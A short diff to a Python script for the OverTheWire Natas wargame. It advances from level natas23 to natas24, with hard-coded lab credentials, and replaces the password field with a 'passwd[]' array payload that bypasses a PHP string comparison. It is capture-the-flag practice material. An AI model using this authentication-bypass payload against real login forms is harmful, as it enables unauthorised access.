@@ -1,12 +1,12 @@
 import requests
 
-username = 'natas23'
-password = 'D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE'
+username = 'natas24'
+password = 'OsRmXFguozKpTZZ5X14zNO43379LZveg'
 
 url = "http://%s.natas.labs.overthewire.org" % username
 
 data = {
-    'passwd': '11eiloveyou'
+    'passwd[]': ''
 }
 
 r = requests.post(url, data=data, auth=(username,password))
